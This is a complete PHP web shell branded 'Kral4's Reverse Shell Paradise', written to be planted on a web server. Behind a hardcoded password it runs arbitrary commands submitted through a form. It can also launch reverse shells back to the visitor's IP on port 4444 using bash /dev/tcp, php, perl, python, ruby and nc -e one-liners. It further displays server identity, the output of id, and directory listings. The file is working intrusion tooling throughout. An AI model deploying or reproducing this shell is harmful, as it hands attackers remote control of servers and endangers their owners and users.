<?php
session_start();
$id = exec("id");
$passwd = "kral4"; // password
$default_ip = ""; //leave empty for automatic detection
$default_port = 4444;
function getbins() {
    $php = exec("which php");
    $bash = exec("which bash");
    $perl = exec("which perl");
    $python = exec("which python");
    $python3 = exec("which python3");
    $ruby = exec("which ruby");
    $nc = exec("which nc");
    return array($php, $bash, $perl, $python, $python3, $nc, $ruby);
}
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    if (isset($_GET["shelltype"])) {
        if ($_SESSION['admin'] == "admin") {
            if (strlen($default_ip) > 0) {
                echo "Sending to default ip $default_ip <br>";
                $ip = $default_ip;
            } else {
                echo "Automatic Detection ". $_SERVER["REMOTE_ADDR"];
                $ip = $_SERVER["REMOTE_ADDR"];
            }
            $shelltype = $_GET["shelltype"];
            if ($shelltype == "bash") { system("bash -c 'bash -i >& /dev/tcp/$ip/$default_port 0>&1'"); } 
            elseif ($shelltype == "php") { system("php -r '\$sock=fsockopen(\"$ip\",$default_port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"); }
            elseif ($shelltype == "perl") { system("perl -e 'use Socket;\$i=\"$ip\";\$p=$default_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"); }
            elseif ($shelltype == "python") { system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
            elseif ($shelltype == "python3") { system("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$default_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"); }
            elseif ($shelltype == "ruby") { system("ruby -rsocket -e'f=TCPSocket.open(\"$ip\",$default_port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"); }
            elseif ($shelltype == "nc") { system("nc -e /bin/sh $ip $default_port"); }
        } else {
            echo "! YOU MUST AUTHENTICATE FOR THIS ACTION !";
        }
    }
}
?>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["passwd"])) {
        sleep(5); // against brute force attacks
        if ($_POST["passwd"] == $passwd) {
            $_SESSION["admin"] = "admin";
            header("Refresh:0");
        } else {
            echo "Incorrect Password<br>";
        }
    }
}
if ($_SESSION["admin"] != "admin") {
    http_response_code(403);
    echo "
    <!DOCTYPE html>
    <html>
    <head>
        <title>Kral4's Reverse Shell Paradise</title>
    </head>
    <body>
    <div style=\"text-align: center;\">
        <h1>Authentication Required</h1>
        <form action=\"\" method=\"post\">
            <input type=\"password\" name=\"passwd\">
            <input type=\"submit\" value=\"login\">
        </form>
    </div>
    </body>
    </html>";
    exit();
}
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Kral4's Reverse Shell Paradise</title>
    </head>
    <body>
        <h3 style="text-align: center;">Kral4's Reverse Shell Paradise</h3>
    <div style="border: 1px solid red;text-align: center;">
        <h5>Run command</h5>
        <form action="" method="post">
            <input type="text" name="cmd">
            <input type="submit" value="run">
        </form>
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            if (isset($_POST["cmd"])) {
                if ($_SESSION["admin"] == "admin") {
                    if (PHP_OS == "WINNT" || PHP_OS == "Windows" || PHP_OS == "WIN32") {
                        $cmdout = shell_exec($_POST["cmd"]);
                        $cmdout = explode("\r\n", $cmdout);
                        foreach ($cmdout as $i) {
                            echo $i."<br>";
                        } 
                    } else {
                        $cmdout = shell_exec($_POST["cmd"]);
                        $cmdout = explode("\n", $cmdout);
                        foreach ($cmdout as $i) {
                            echo $i."<br>";
                        }
                    }
                }    
            }
        }
        ?>
    </div>
    <h4 style="text-align: center;">System Information</h4>
    <div style="border: 1px solid green;text-align: left;">
    <?php
    echo "<b>Available Reverse Shell :</b><br>";
    foreach(getbins() as $bin) {
        $lastslash = explode("/", $bin);
        echo "<button onclick=\"window.location.href='?shelltype=".end($lastslash)."'\">Shell</button>".$bin."<br>";
    }
    ?>
    </div>
    <div style="border: 1px solid green;text-align: left;">
    <?php
    echo "<b>IP :</b>".$_SERVER["SERVER_ADDR"]."<br>";
    echo "<b>HOSTNAME :</b>".$_SERVER["SERVER_NAME"]."<br>";
    echo "<b>SOFTWARE :</b>".$_SERVER["SERVER_SOFTWARE"]."<br>";
    echo "<b>SERVER ADMIN :</b>".$_SERVER["SERVER_ADMIN"]."<br>";
    echo "<b>OS :</b>".php_uname()."<br>";
    echo "<b>ID :</b>".$id."<br>";
    if (PHP_OS == "WINNT" || PHP_OS == "Windows" || PHP_OS == "WIN32") {
        echo "<b>Directory Listing :</b><br>";
        echo exec("cd")."<br>";
        $dirlist = shell_exec("dir /q");
        $dirlist = explode("\r\n", $dirlist);
        foreach ($dirlist as $i) {
            echo $i."<br>";
        }
    } else {
        echo "<b>Directory Listing :</b><br>";
        echo exec("pwd")."<br>";
        $dirlist = shell_exec("ls -lah");
        $dirlist = explode("\n", $dirlist);
        foreach ($dirlist as $i) {
            echo $i."<br>";
        }
    }
    ?>
    </div>
    <h4 style="text-align: center;">About You</h4>
    <div style="border: 1px solid blue;text-align: left;">
    <?php
    echo "<b>IP :</b>".$_SERVER["REMOTE_ADDR"]."<br>";
    echo "<b>HTTP REFERER :</b>".$_SERVER["HTTP_REFERER"]."<br>";
    echo "<b>USER AGENT :</b>".$_SERVER["HTTP_USER_AGENT"]."<br>";
    ?>
    </div>
</body>
</html>
